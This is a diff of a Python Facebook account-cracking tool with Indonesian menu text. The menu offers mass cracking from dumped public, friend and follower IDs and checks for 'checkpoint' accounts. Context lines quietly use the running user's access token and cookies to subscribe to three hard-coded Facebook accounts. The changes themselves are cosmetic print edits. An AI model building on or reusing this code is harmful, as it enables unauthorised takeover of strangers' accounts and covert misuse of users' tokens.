@@ -270,6 +270,8 @@ def ___fii___Sayang___Kamu___Widiya___():
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=%s'%(token),cookies=cookie)
+    print(f"{B} | ")
+    print(f"{P}[•] login Berhasil")
     menu()
 	
 ###### BUAT MENU
@@ -302,14 +304,14 @@ def menu():
     print(f"{B} | ")
     print(f"{B}___________________________________________")
     print(f"{B} | ")
-    print(f"{P}[1] Crack massal dari dump id publik ")
+    jalan(f"{P}[1] Crack massal dari dump id publik ")
     print(f"{P}[2] Crack dari dump id publik")
     print(f"{P}[3] Crack dari dump id pertemanan sendiri")
     print(f"{P}[4] Crack dari dump id followers")
     print(f"{P}[5] Ganti user-agent")
     print(f"{P}[6] Chek results crack")
     print(f"{P}[7] Chek opsi account chekpoint")
-    print(f"{M}[0] Log Out ")
+    jalan(f"{M}[0] Log Out ")
     print(f"{B} | ")
     pp = input(f"{P}[*] Pilih Yang Mana : {B}")
     if pp in ["1","01"]:
@@ -472,7 +474,7 @@ def userset():
         if usera == lololr:
             print(f"{B} | ")
             print(f"{B} | ")
-            print(f"{P}[•] Sukses mengganti");menu()
+            jalan(f"{P}[•] Sukses mengganti");menu()
         else:print(f"{P}[•]{M} Gagal mengganti user agent ");exit()
     
     elif _pil_ in ["2","02"]:
